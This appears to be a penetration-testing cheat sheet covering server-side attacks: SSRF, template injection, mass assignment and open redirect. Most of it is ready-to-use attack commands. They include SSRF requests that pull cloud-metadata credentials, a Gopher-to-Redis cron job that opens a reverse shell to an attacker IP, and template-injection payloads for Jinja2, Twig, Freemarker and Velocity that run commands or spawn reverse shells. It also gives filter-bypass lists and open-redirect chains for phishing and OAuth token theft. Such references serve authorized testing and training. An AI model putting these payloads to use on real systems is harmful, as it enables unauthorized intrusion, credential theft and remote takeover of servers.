# Server-Side Attacks

Covers SSRF, SSTI, mass assignment, and open redirect — server-side vulnerabilities where attacker input is processed by the server in unintended ways.

---

## SSRF (Server-Side Request Forgery)

Server makes HTTP requests to attacker-controlled destinations. Used to reach internal services, cloud metadata, or chain to RCE.

### Identify SSRF

```bash
# Any parameter that takes a URL or hostname is a candidate:
# ?url=, ?path=, ?dest=, ?redirect=, ?uri=, ?target=, ?proxy=, ?src=, ?fetch=, ?load=

# Baseline — point at your listener
# python3 -m http.server 8080  (or use Burp Collaborator / interactsh)
curl -s "http://<target>/fetch?url=http://<attacker-ip>:8080/test"

# interactsh-client one-liner
interactsh-client &
curl -s "http://<target>/fetch?url=https://<generated>.oast.fun"

# Common locations to find SSRF:
# - Webhooks (URL field)
# - PDF generators (inject <img src="http://...">)
# - Image upload by URL
# - "Preview URL" / "Check link" features
# - XML/SOAP with external URLs
# - Redirect parameters
```

### Basic Internal Access

```bash
# Access internal services not exposed externally
curl -s "http://<target>/fetch?url=http://127.0.0.1:80/"
curl -s "http://<target>/fetch?url=http://127.0.0.1:8080/"
curl -s "http://<target>/fetch?url=http://127.0.0.1:22/"
curl -s "http://<target>/fetch?url=http://127.0.0.1:3306/"
curl -s "http://<target>/fetch?url=http://localhost/admin"
curl -s "http://<target>/fetch?url=http://192.168.1.1/"   # internal gateway

# Internal port scan via SSRF + response size/time differences
for port in 22 25 80 443 3306 5432 6379 8080 8443 27017; do
  size=$(curl -so /dev/null -w "%{size_download}" --max-time 3 \
    "http://<target>/fetch?url=http://127.0.0.1:$port/")
  echo "Port $port: $size bytes"
done

# ffuf for port scan
ffuf -w <(seq 1 65535 | tr '\n' '\n') \
  -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ/" \
  -fs 0 -mc all -t 50
```

### Cloud Metadata

```bash
# AWS IMDSv1 (no auth required)
curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/user-data"
# Returns: AccessKeyId, SecretAccessKey, Token — use with aws cli

# AWS IMDSv2 (requires token — try v1 first)
# Step 1: get token (may not work via SSRF)
curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Alternate: try via Gopher (see below)

# Azure IMDS
curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata
curl -s "http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"
curl -s "http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Note: headers may not be passable via SSRF — try without them first
```

### Filter Bypass Techniques

```bash
# Blacklist bypass — alternative representations of 127.0.0.1
curl -s "http://<target>/fetch?url=http://2130706433/"      # decimal
curl -s "http://<target>/fetch?url=http://0177.0.0.1/"      # octal
curl -s "http://<target>/fetch?url=http://0x7f000001/"      # hex
curl -s "http://<target>/fetch?url=http://127.1/"            # short form
curl -s "http://<target>/fetch?url=http://[::1]/"            # IPv6 loopback
curl -s "http://<target>/fetch?url=http://[::]/"             # IPv6 any

# DNS rebinding / redirect bypass — use a domain you control that resolves to 127.0.0.1
# nip.io / xip.io style:
curl -s "http://<target>/fetch?url=http://127.0.0.1.nip.io/"

# URL confusion
curl -s "http://<target>/fetch?url=http://attacker.com@127.0.0.1/"
curl -s "http://<target>/fetch?url=http://127.0.0.1#attacker.com"

# Protocol handlers
curl -s "http://<target>/fetch?url=file:///etc/passwd"
curl -s "http://<target>/fetch?url=dict://127.0.0.1:11211/stats"   # Memcached
curl -s "http://<target>/fetch?url=ftp://127.0.0.1/etc/passwd"

# Redirect chain bypass — host a redirect on attacker server
# attacker.com/r → 302 → http://127.0.0.1/admin
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location','http://127.0.0.1/admin')
        self.end_headers()
    def log_message(self,*a): pass
http.server.HTTPServer(('0.0.0.0',8080),H).serve_forever()
"
curl -s "http://<target>/fetch?url=http://<attacker-ip>:8080/r"
```

### Gopher Protocol (SSRF → RCE)

Gopher lets you send raw TCP data — reach Redis, Memcached, SMTP, MySQL:

```bash
# Gopher to Redis — write cron job for shell
# Redis commands (URL-encoded gopher payload):
# FLUSHALL
# SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\n\n"
# CONFIG SET dir /var/spool/cron/
# CONFIG SET dbfilename root
# BGSAVE

# URL: gopher://127.0.0.1:6379/_<URL-encoded redis commands>
# Use Gopherus to generate payloads:
# pip install gopherus  OR  git clone https://github.com/tarunkant/Gopherus
gopherus --exploit redis
# Enter: phpshell / crontab / etc.
# Copy output URL into SSRF parameter

# Gopher to FastCGI (if PHP-FPM on 9000)
gopherus --exploit fastcgi
# Enter /var/www/html/index.php and your command

# Gopher to MySQL (no-auth or default creds)
gopherus --exploit mysql
```

### Blind SSRF

```bash
# No response — use out-of-band (OOB) detection
# interactsh setup:
interactsh-client -server interactsh.com -n 1
# Get: <random>.oast.fun

curl -s "http://<target>/fetch?url=https://<random>.oast.fun/test"
# If interactsh shows DNS/HTTP interaction → SSRF confirmed blind

# Burp Collaborator alternative:
# Use Burp Pro → Collaborator client → generate URL → insert in parameter
# Check for DNS/HTTP interactions in Collaborator tab

# Timing-based port detection (closed = fast, open = slow/different)
time curl -s --max-time 5 "http://<target>/fetch?url=http://127.0.0.1:22/"
time curl -s --max-time 5 "http://<target>/fetch?url=http://127.0.0.1:9999/"
```

---

## SSTI (Server-Side Template Injection)

User input is concatenated into a template string and evaluated by the template engine. Detect engine, then escalate to RCE.

### Detection

```bash
# Inject math expressions — each engine has unique syntax
# If any of these return evaluated results, SSTI exists:
curl -s "http://<target>/page?name={{7*7}}"      # Jinja2/Twig → 49
curl -s "http://<target>/page?name=${7*7}"        # Freemarker/Mako → 49
curl -s "http://<target>/page?name=<%= 7*7 %>"   # ERB/EJS → 49
curl -s "http://<target>/page?name=#{7*7}"        # Ruby ERB → 49
curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig → 49

# Engine fingerprint decision tree:
# {{7*7}} → 49        = Twig (PHP) or Jinja2 (Python)
# {{7*'7'}} → 7777777 = Jinja2
# {{7*'7'}} → 49      = Twig
# ${7*7} → 49         = Freemarker (Java) or Mako (Python)
# *{7*7} → 49         = Spring (Java / Thymeleaf)

# Also test in headers, cookies, form fields, JSON values
```

### Jinja2 (Python — Flask/Django)

```bash
# Dump config (Flask secret key, DB creds)
{{config}}
{{config.items()}}

# Read files
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of <class 'subprocess.Popen'> — usually around 258-400
# Then:
{{''.__class__.__mro__[1].__subclasses__()[258](['id'],stdout=-1).communicate()[0].decode()}}

# Simpler RCE via cycler/joiner globals:
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Reverse shell
{{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"').read()}}

# URL-encode for GET parameters:
# %7B%7Bcycler.__init__.__globals__.os.popen(%27id%27).read()%7D%7D
curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read()}}" \
  "http://<target>/greet"
```

### Twig (PHP — Symfony)

```bash
# Version check
{{_self.env.getExtension('Twig_Extension_Debug')}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Twig v2+
{{['id']|map('system')|join}}
{{['id']|filter('system')}}

# Reverse shell
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'")}}
```

### Freemarker (Java)

```bash
# Basic RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Full template
<#assign cmd="id"><#assign ex="freemarker.template.utility.Execute"?new()>${ex(cmd)}

# Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,<b64-revshell>}|{base64,-d}|bash")}
```

### Velocity (Java — Confluence/JIRA)

```bash
# RCE via ClassTool
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# Simpler (if ClassTool available)
#set($runtime=<% Runtime.getRuntime() %>)
```

### SSTImap (Automation)

```bash
# Install
git clone https://github.com/vladko312/SSTImap
cd SSTImap && pip3 install -r requirements.txt

# Auto-detect engine and test
python3 sstimap.py -u "http://<target>/page?name=*"

# Interactive shell
python3 sstimap.py -u "http://<target>/page?name=*" --os-shell

# Run single command
python3 sstimap.py -u "http://<target>/page?name=*" -c "id"

# POST parameter
python3 sstimap.py -u "http://<target>/greet" -d "name=*"

# With cookies
python3 sstimap.py -u "http://<target>/page?name=*" \
  -c "id" --cookie "session=<value>"
```

---

## Mass Assignment

Frameworks that auto-bind request parameters to object properties may allow setting fields that weren't intended to be user-controlled (role, admin flag, price, balance).

### Identify

```bash
# Register/update requests — look for what fields the app accepts
# If API returns more fields than the form shows → test setting them

# Example: register endpoint takes {"username":"x","password":"y"}
# API returns: {"id":5,"username":"x","isAdmin":false,"role":"user"}
# Try submitting isAdmin/role in the registration request

# Test fields from API responses that the form doesn't expose
curl -s -X POST "http://<target>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd","role":"admin"}'

curl -s -X POST "http://<target>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd","isAdmin":true}'

# Profile update — escalate role
curl -s -X PUT "http://<target>/api/profile" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"username":"user","email":"x@x.com","role":"admin","balance":999999}'

# Check JSON vs form body — frameworks may handle differently
curl -s -X POST "http://<target>/checkout" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "product_id=1&qty=1&price=0.01"
```

### Framework-Specific Notes

```bash
# Ruby on Rails — params.permit() whitelist bypass
# If controller uses: params.require(:user).permit(:username, :email)
# Try passing: user[admin]=true in POST body

# Laravel/PHP — $fillable vs $guarded
# If $guarded = [] → all fields bindable

# Django — ModelForm without exclude → all fields
# Spring — @ModelAttribute binds all matching fields

# Node/Express — req.body spread into DB update
# PUT /api/user → {...req.body} → includes any field in body

# Enumerate object properties from GET response, then add them to POST/PUT
curl -s "http://<target>/api/profile/5" | python3 -m json.tool
# Add every returned key to PUT body with modified values
```

---

## Open Redirect

App redirects to a user-controlled URL. Used to phish, bypass URL validation, steal OAuth tokens, or chain with SSRF.

### Identify

```bash
# Parameters that commonly hold redirect destinations:
# ?redirect=, ?url=, ?next=, ?return=, ?returnTo=, ?goto=, ?redir=, ?destination=

# Test with external URL
curl -sv "http://<target>/login?redirect=https://evil.com" 2>&1 | grep -i location
# Look for: Location: https://evil.com

# Check response body for redirects too (JS-based)
curl -s "http://<target>/logout?next=https://evil.com" | grep -i "window.location\|href="

# After login — check where the redirect parameter goes
# OAuth flows often use redirect_uri — test pointing to attacker.com
```

### Filter Bypass

```bash
# Whitelist bypass — trick validation to allow external URL
curl -sv "http://<target>/redirect?url=https://evil.com%2F@target.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=https://target.com.evil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=//evil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=\/\/evil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=https:evil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=%2F%2Fevil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=https://evil%E3%80%82com" 2>&1 | grep location  # Unicode dot

# Starts-with check bypass
curl -sv "http://<target>/redirect?url=https://target.com.evil.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=https://target.com@evil.com" 2>&1 | grep location

# Substring check bypass
curl -sv "http://<target>/redirect?url=https://evil.com?target.com" 2>&1 | grep location
curl -sv "http://<target>/redirect?url=https://evil.com#target.com" 2>&1 | grep location

# Double URL encoding
curl -sv "http://<target>/redirect?url=%2568ttps://evil.com" 2>&1 | grep location

# JavaScript redirect (href/location not in redirect header)
curl -s "http://<target>/redirect?url=javascript:alert(1)"
```

### Exploitation Chains

```bash
# 1. Open redirect → phishing
# Send victim: https://target.com/redirect?url=https://evil.com/fake-login
# Victim sees legitimate domain in URL bar before redirect

# 2. Open redirect → OAuth token theft
# If OAuth callback uses redirect_uri:
# https://target.com/oauth/callback?code=<code>&redirect_uri=https://target.com/redirect?url=https://evil.com
# → OAuth redirects code to your server via the open redirect

# 3. Open redirect → SSRF
# Some apps validate redirect URL then make server-side request to it
# Use open redirect to bypass SSRF filter
# https://<target>/fetch?url=https://<target>/redirect?url=http://169.254.169.254/

# 4. Open redirect + CSRF — force victim to authenticated action
# Embed in phish email: link to open redirect → page that triggers CSRF
```

---

## Quick Reference

```bash
# SSRF — quick internal probe
curl -s "http://<target>/param?url=http://127.0.0.1:80/"
curl -s "http://<target>/param?url=http://169.254.169.254/latest/meta-data/"

# SSTI — quick detection
for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}'; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
  resp=$(curl -s "http://<target>/page?name=$encoded")
  echo "$payload → $(echo $resp | grep -oP '\d{2}')"
done

# Mass assignment — inject extra fields
# Register with role:
curl -s -X POST "http://<target>/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"x","password":"y","role":"admin","isAdmin":true}'

# Open redirect check
curl -sv "http://<target>/redirect?url=https://example.com" 2>&1 | grep -i "^< location"
```
